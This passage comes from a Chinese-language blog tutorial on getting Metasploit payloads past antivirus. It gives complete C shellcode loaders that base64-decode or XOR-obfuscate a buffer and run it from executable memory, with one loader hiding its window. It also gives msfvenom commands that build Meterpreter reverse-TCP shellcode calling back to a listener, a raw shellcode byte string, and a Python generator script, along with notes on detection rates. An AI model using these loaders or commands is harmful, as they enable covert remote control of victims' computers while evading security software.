class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>base64.h</code>文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _BASE64_H_</span><br><span class="line">#define _BASE64_H_</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    int Base64encode_len(int len);</span><br><span class="line">    int Base64encode(char * coded_dst, const char *plain_src, int len_plain_src);</span><br><span class="line"></span><br><span class="line">    int Base64decode_len(const char * coded_src);</span><br><span class="line">    int Base64decode(char * plain_dst, const char *coded_src);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#endif //_BASE64_H_</span><br></pre></td></tr></table></figure><p>使用gcc进行编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shellcode.c base64.c -o test.exe</span><br></pre></td></tr></table></figure><p>执行exe可正常上线</p><p><strong>方法二</strong></p><p>与方法一略有不同</p><p>base64.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">//  base64.c</span><br><span class="line">//  base64</span><br><span class="line">//</span><br><span class="line">//  Created by guofu on 2017/5/25.</span><br><span class="line">//  Copyright © 2017年 guofu. All rights reserved.</span><br><span class="line">//</span><br><span class="line">/**</span><br><span class="line">*  转解码过程</span><br><span class="line">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span><br><span class="line">*  先将要编码的转成对应的ASCII值</span><br><span class="line">*  如编码: s 1 3</span><br><span class="line">*  对应ASCII值为: 115 49 51</span><br><span class="line">*  对应二进制为: 01110011 00110001 00110011</span><br><span class="line">*  将其6个分组分4组: 011100 110011 000100 110011</span><br><span class="line">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span><br><span class="line">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span><br><span class="line">*  查找base64 转换表 对应 c z E z</span><br><span class="line">*</span><br><span class="line">*  解码</span><br><span class="line">*  c z E z</span><br><span class="line">*  对应ASCII值为 99 122 69 122</span><br><span class="line">*  对应表base64_suffix_map的值为 28 51 4 51</span><br><span class="line">*  对应二进制值为 00011100 00110011 00000100 00110011</span><br><span class="line">*  依次去除每组的前两位, 再拼接成3字节</span><br><span class="line">*  即: 01110011 00110001 00110011</span><br><span class="line">*  对应的就是s 1 3</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &quot;base64.h&quot;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// base64 转换表, 共64个</span><br><span class="line">static const char base64_alphabet[] = &#123;</span><br><span class="line">    &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;,</span><br><span class="line">    &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;,</span><br><span class="line">    &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;,</span><br><span class="line">    &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;,</span><br><span class="line">    &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;,</span><br><span class="line">    &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;,</span><br><span class="line">    &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;,</span><br><span class="line">    &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;,</span><br><span class="line">    &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;,</span><br><span class="line">    &#x27;+&#x27;, &#x27;/&#x27; &#125;;</span><br><span class="line"></span><br><span class="line">// 解码时使用</span><br><span class="line">static const unsigned char base64_suffix_map[256] = &#123;</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,</span><br><span class="line">    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,</span><br><span class="line">    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,</span><br><span class="line">    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,</span><br><span class="line">    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,</span><br><span class="line">    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,</span><br><span class="line">    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,</span><br><span class="line">    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,</span><br><span class="line">    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,</span><br><span class="line">    255, 255, 255, 255 &#125;;</span><br><span class="line"></span><br><span class="line">static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) &#123;</span><br><span class="line">    src &lt;&lt;= lnum; // src = src &lt;&lt; lnum;</span><br><span class="line">    src &gt;&gt;= rnum; // src = src &gt;&gt; rnum;</span><br><span class="line">    return src;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int base64_encode(const char *indata, int inlen, char *outdata, int *outlen) &#123;</span><br><span class="line"></span><br><span class="line">    int ret = 0; // return value</span><br><span class="line">    if (indata == NULL || inlen == 0) &#123;</span><br><span class="line">        return ret = -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span><br><span class="line">    int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span><br><span class="line">    if (inlen % 3 != 0) &#123;</span><br><span class="line">        pad_num = 3 - inlen % 3;</span><br><span class="line">    &#125;</span><br><span class="line">    in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数)</span><br><span class="line"></span><br><span class="line">    int out_len = in_len * 8 / 6; // 编码后的长度</span><br><span class="line"></span><br><span class="line">    char *p = outdata; // 定义指针指向传出data的首地址</span><br><span class="line"></span><br><span class="line">                       //编码, 长度为调整后的长度, 3字节一组</span><br><span class="line">    for (int i = 0; i &lt; in_len; i += 3) &#123;</span><br><span class="line">        int value = *indata &gt;&gt; 2; // 将indata第一个字符向右移动2bit(丢弃2bit)</span><br><span class="line">        char c = base64_alphabet[value]; // 对应base64转换表的字符</span><br><span class="line">        *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节</span><br><span class="line"></span><br><span class="line">                //处理最后一组(最后3字节)的数据</span><br><span class="line">        if (i == inlen + pad_num - 3 &amp;&amp; pad_num != 0) &#123;</span><br><span class="line">            if (pad_num == 1) &#123;</span><br><span class="line">                *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))];</span><br><span class="line">                *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)];</span><br><span class="line">                *(p + 3) = &#x27;=&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (pad_num == 2) &#123; // 编码后的数据要补两个 &#x27;=&#x27;</span><br><span class="line">                *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)];</span><br><span class="line">                *(p + 2) = &#x27;=&#x27;;</span><br><span class="line">                *(p + 3) = &#x27;=&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123; // 处理正常的3字节的数据</span><br><span class="line">            *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)];</span><br><span class="line">            *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)];</span><br><span class="line">            *(p + 3) = base64_alphabet[*(indata + 2) &amp; 0x3f];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p += 4;</span><br><span class="line">        indata += 3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (outlen != NULL) &#123;</span><br><span class="line">        *outlen = out_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int base64_decode(const char *indata, int inlen, char *outdata) &#123;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    if (indata == NULL || inlen &lt;= 0 || outdata == NULL ) &#123;</span><br><span class="line">        return ret = -1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (inlen % 4 != 0) &#123; // 需要解码的数据不是4字节倍数</span><br><span class="line">        return ret = -2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int t = 0, x = 0, y = 0, i = 0;</span><br><span class="line">    unsigned char c = 0;</span><br><span class="line">    int g = 3;</span><br><span class="line"></span><br><span class="line">    while (indata[x] != 0) &#123;</span><br><span class="line">        // 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span><br><span class="line">        c = base64_suffix_map[indata[x++]];</span><br><span class="line">        if (c == 255) return -1;// 对应的值不在转码表中</span><br><span class="line">        if (c == 253) continue;// 对应的值是换行或者回车</span><br><span class="line">        if (c == 254) &#123; c = 0; g--; &#125;// 对应的值是&#x27;=&#x27;</span><br><span class="line">        t = (t &lt;&lt; 6) | c; // 将其依次放入一个int型中占3字节</span><br><span class="line">        if (++y == 4) &#123;</span><br><span class="line">            outdata[i++] = (unsigned char)((t &gt;&gt; 16) &amp; 0xff);</span><br><span class="line">            if (g &gt; 1) outdata[i++] = (unsigned char)((t &gt;&gt; 8) &amp; 0xff);</span><br><span class="line">            if (g &gt; 2) outdata[i++] = (unsigned char)(t &amp; 0xff);</span><br><span class="line">            y = t = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64.h</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ifndef base64_h</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define base64_h</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> __cplusplus</span></span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);</span><br><span class="line">    int base64_decode(const char *indata, int inlen, char *outdata);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif /* base64_h */</span></span><br></pre></td></tr></table></figure><p>shellcode.c</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;msf base64 code&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char str3[1000] = &#123; 0 &#125;;</span><br><span class="line">    //printf(&quot;%s &quot;, buf);</span><br><span class="line">    base64_decode(buf, (int)strlen(buf), str3);</span><br><span class="line"></span><br><span class="line">    //printf(&quot;%d  &quot;, sizeof(str3));</span><br><span class="line"></span><br><span class="line">    char *Memory;</span><br><span class="line"></span><br><span class="line">    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(Memory, str3, sizeof(str3));</span><br><span class="line"></span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用msf生成base64编码的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</span><br></pre></td></tr></table></figure><p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。</p><p>使用gcc进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shellcode.c base64.c -o test.exe</span><br></pre></td></tr></table></figure><p>执行exe即可上线</p><h4 id="8-python变形shellcode-汇编代码-未能复现成功"><a href="#8-python变形shellcode-汇编代码-未能复现成功" class="headerlink" title="8.python变形shellcode+汇编代码(未能复现成功)"></a>8.python变形shellcode+汇编代码(未能复现成功)</h4><p>msf生成shellcode（就用这种吧，其他的下面脚本会报错）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure><p>python2环境，需要安装capstone和keystone-engine包。使用脚本对shellcode进行变形<code>https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py</code></p><p>将脚本中的<code>CODE = b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;     </code>替换为shell.c的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/webtools/BypassAntiVirus/encode_shellcode_python# python encode_shellcode.py</span><br><span class="line">unsigned char buf[]=&#123;0x90, 0xbb, 0x71, 0xe3, 0xaa, 0x34, 0x90, 0xdb, 0xcf, 0x90, 0xd9, 0x74, 0x24, 0xf4, 0x90, 0x58, 0x90, 0x29, 0xc9, 0x90, 0xb1, 0x59, 0x90, 0x83, 0xe8, 0xfc, 0x90, 0x31, 0x58, 0x10, 0x90, 0x3, 0x58, 0x10, 0x90, 0x93, 0x90, 0x66, 0x16, 0x90, 0x56, 0x90, 0xdc, 0xdc, 0x90, 0xd9, 0xa7, 0x1d, 0x82, 0x50, 0x42, 0x90, 0x2c, 0x90, 0x90, 0x66, 0x7, 0x90, 0x66, 0x6, 0x90, 0x1d, 0x24, 0x43, 0x4a, 0xae, 0x90, 0xcf, 0x90, 0x1, 0x7f, 0x25, 0x90, 0xbd, 0x8d, 0x4e, 0xc6, 0x4e, 0x90, 0x79, 0xe1, 0x90, 0x66, 0x1e, 0x90, 0x61, 0x90, 0x45, 0x90, 0x57&#125;;</span><br></pre></td></tr></table></figure><p>再在vs2019中编译以下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">#define fucku __asm&#123;mov eax,eax&#125;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">    typedef int(*pfunc)(void);</span><br><span class="line">    unsigned char buf[] = &#123;&#125;;</span><br><span class="line">    fucku;</span><br><span class="line">    BYTE* sc = (BYTE*)VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    fucku;</span><br><span class="line">    fucku;</span><br><span class="line">    //memcpy(sc,buf,sizeof(buf));</span><br><span class="line">    for (int i = 0; i&lt;sizeof(buf); i++) &#123;</span><br><span class="line">        fucku;</span><br><span class="line">        sc[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    pfunc shellcode = (pfunc)sc;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push shellcode</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    //HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);</span><br><span class="line">    //WaitForSingleObject(lpThread,-1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="9-python-xor处理（VT-20-70-不能过360）"><a href="#9-python-xor处理（VT-20-70-不能过360）" class="headerlink" title="9.python+xor处理（VT:20&#x2F;70 不能过360）"></a>9.python+xor处理（VT:20&#x2F;70 不能过360）</h4><p>msf生成shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure><p>python生成xor代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">raw = r&quot;&quot;&quot;</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;shellcode;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">regx = re.compile(r&quot;\\x\w\w&quot;)</span><br><span class="line">arr = re.findall(regx,raw)</span><br><span class="line">for i in range(0,len(arr)):</span><br><span class="line">    arr[i] = arr[i].replace(&quot;\\&quot;,&quot;0&quot;)</span><br><span class="line">data = &quot;&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/subsystem:\\&quot;</span>windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;<span class="string">&quot;)</span></span></span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[333];</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">data = data + &quot;    &quot;</span><br><span class="line">print(len(arr))</span><br><span class="line">for i in range(len(arr)):</span><br><span class="line">    data = data + &quot;buf[&quot;+ str(i) +&quot;] = &quot; + arr[i] + &quot;^ 0x5f ^ 0x5f;&quot;</span><br><span class="line">    if(i%100 == 0):</span><br><span class="line">        data = data + &quot;\r\n    &quot;</span><br><span class="line"></span><br><span class="line">data = data + &quot;&quot;&quot;</span><br><span class="line">    ((void(*)(void))&amp;buf)();</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    